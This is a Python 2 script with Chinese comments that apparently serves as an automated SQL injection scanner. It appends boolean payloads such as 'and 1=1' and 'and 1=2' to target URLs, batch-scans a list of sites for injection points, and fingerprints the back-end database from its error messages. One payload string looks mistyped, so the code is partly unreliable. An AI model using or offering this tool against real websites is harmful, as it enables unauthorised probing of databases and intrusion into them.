#coding=gb2312
import urllib
import os
import string
from re import search

class injectTest():
    def __init__(self,url=''):
        self.url=url             #待检测网址,默认为空
        self.a='%20and%201=1'  #检测语句
        self.b='%20and%201=2'
        self.urls=[]             #存在注入的urls

    #检测单个网址的函数
    def judgeUrl(self):
        page=urllib.urlopen(self.url).read()
        pagea=urllib.urlopen(self.url+self.a).read()
        pageb=urllib.urlopen(self.url+self.b).read()
        if page==pagea and page!=pageb:
            print ('网址',self.url,'可能存在注入点!')
            return True
        else:
            print ('网址:',self.url,'不存在注入点!')
            return False

    #判断待检测的网址文件是否存在
    def fileExists(self,name):
        path=os.getcwd()
        filepath=path+'\\'
        filepath=filepath+name
        return os.path.exists(filepath)

    #进行批量检测
    def judgeUrls(self,file):
        self.fileExists(file)
        #如果不存在默认检测的网址文件,则由用户自行输入待检测的文件
        while not self.fileExists(file):
            print ('待检测网址文件不存在')
            file=str(input('请输入待检测的网址文件:'))
            self.fileExists(file)
        urls=open(file,'r')
        for url in urls.readlines():
            print ('正在检测:',url)
            page=urllib.urlopen(url).read()
            pagea=urllib.urlopen(url+self.a).read()
            pageb=urllib.urlopen(url+self.b).read()
            if page==pagea and page!=pageb:
                self.urls.append(url)
            else:
                continue
        if len(self.urls):
            print ('以下网址可能存在注入点:')
            for u in self.urls:
                print (u)
        else:
            print ('该文件中不存在有注入的网址!')

    #判断有注入的网址的数据库类型
    #如果不存在回显错误,则可能不能判断出数据库的类型
    def whatDatabase(self):
        db=''
        sql=string.join(['%20and20%user>0'],'')
        pagex=urllib.urlopen(self.url+sql).read()
        if search('ODBC Microsoft Access',pagex) or search('Microsoft JET Database',pagex) :
            print ('数据库:Access')
            db='Access'
            return db
        elif search('SQL Server',pagex) or search('nvarchar',pagex):
            print ('数据库:MSSQL')
            db='MSSQL'
            return  db
        elif search('You have an error in your SQL syntax',pagex) or search('Query failed',pagex) or search('SQL query failed',pagex) or search('mysql_fetch_',pagex) or search('mysql_num_rows',pagex) or search('The used SELECT statements have a different number of columns',pagex):
            print ('数据库:MYSQL')
            db='MYSQL'
            return db
        else:
            print ('未判断出数据库类型!')
            return db